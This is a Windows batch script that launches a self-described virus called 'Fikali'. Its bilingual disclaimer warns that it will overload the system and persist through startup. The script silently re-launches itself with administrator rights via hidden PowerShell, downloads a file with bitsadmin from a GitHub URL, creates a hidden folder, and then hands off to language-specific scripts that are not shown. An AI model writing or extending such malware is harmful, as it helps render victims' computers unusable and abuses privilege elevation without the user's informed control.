@echo off
call :Adm
chcp 866
color e
ver | find "5.0" >nul && exit
cls
goto disclaimer

:disclaimer
title Disclaimer!..
echo Disclaimer! / Дисклеймер!
echo.
echo En: Fikali is a virus that can load your system to the point where you can't use it.
echo     Restarting your computer will not help you, since this virus is written to startup.
echo     Wait 10 seconds...
echo.
echo Ru: Fikali, это вирус который может нагрузить вашу систему до того, что вы не сможете ей пользоваться. 
echo     Перезагрузка компьютера вам не поможет так как этот вирус прописывается в автозагрузку. 
echo     Подождите 10 секунд...
title 10..
timeout /t 1 /nobreak >nul
title 9..
timeout /t 1 /nobreak >nul
title 8..
timeout /t 1 /nobreak >nul
title 7..
timeout /t 1 /nobreak >nul
title 6..
timeout /t 1 /nobreak >nul
title 5..
timeout /t 1 /nobreak >nul
title 4..
timeout /t 1 /nobreak >nul
title 3..
timeout /t 1 /nobreak >nul
title 2..
timeout /t 1 /nobreak >nul
title 1..
timeout /t 1 /nobreak >nul
title Press any key to continue...
echo.
echo.
echo Нажмите любую клавишу для продолжения / Press any key to continue
pause >nul
goto qe

:qe
cls
title Connection...
echo En: Are you connected to the internet? (y/n)
echo Ru: Вы подключены к Интернету? (y/n)

echo.
Set /p choice="Choice / Выбор: "
if not defined choice goto qe
if "%choice%"=="y" (goto ce)
if "%choice%"=="n" (goto nc)
cls
goto qe

:ce
cls
title Please wait...
echo Please wait...
bitsadmin /transfer "GGYT" https:/raw.githubusercontent.com/SuperPaket123YT/Fikali/fikali/files/art.txt C:\Fikali\files\art.txt >nul
mkdir C:\temp_fikali
attrib +h C:\temp_fikali
cls
goto nc

:nc
ver | find "10.0.22621" >nul && goto warn
cls
goto c

:warn
cls
title Warning!
type C:\Fikali\files\art.txt
echo.
echo En: Wait! You are using Windows 11! This program may not work correctly on this OS!
echo If you find bugs, write to E-mail: superpaket123yt@gmail.com
echo Wait 5 seconds to continue
echo.
echo Ru: Постой! Вы используете Windows 11! Эта программа может неправильно работать на этой ОС!
echo Если вы найдёте баги, напишите на E-mail: superpaket123yt@gmail.com
echo Для продолжения подождите 5 секунд
echo.
title 5..
timeout /t 1 /nobreak >nul
title 4..
timeout /t 1 /nobreak >nul
title 3..
timeout /t 1 /nobreak >nul
title 2..
timeout /t 1 /nobreak >nul
title 1..
timeout /t 1 /nobreak >nul
title Press any key to continue...
echo Нажмите любую клавишу для продолжения / Press any key to continue
pause >nul
goto c

:c
cls
type C:\fikali\files\art.txt
echo.
title Choose language...
echo Please select a language
echo.
echo.
echo 1 - English
echo 2 - Русский
echo 3 - Украiнський
echo 4 - Polski

echo.
Set /p choice="Choice: "
if not defined choice goto c
if "%choice%"=="1" (goto en)
if "%choice%"=="2" (goto ru)
if "%choice%"=="3" (goto ukr)
if "%choice%"=="4" (goto pol)
cls
goto c

:ru
cls
cd C:\fikali\files\languages\ru
start ru.bat
cls
exit

:en
cls
cd C:\fikali\files\languages\en
start en.bat
cls
exit

:ukr
cls
type C:\fikali\files\art.txt
echo.
echo Ця мова ще не готова. Вибачте.
pause
goto c

:pol
cls
type C:\fikali\files\art.txt
echo.
echo Ten jezyk nie jest jeszcze gotowy. Przepraszam.
pause
goto c

:Adm
reg query "HKU\S-1-5-19\Environment" >nul 2>&1
if not %errorlevel% EQU 0 (
    cls
    powershell.exe -windowstyle hidden -noprofile "Start-Process '%~dpnx0' -Verb RunAs"
    exit 
)
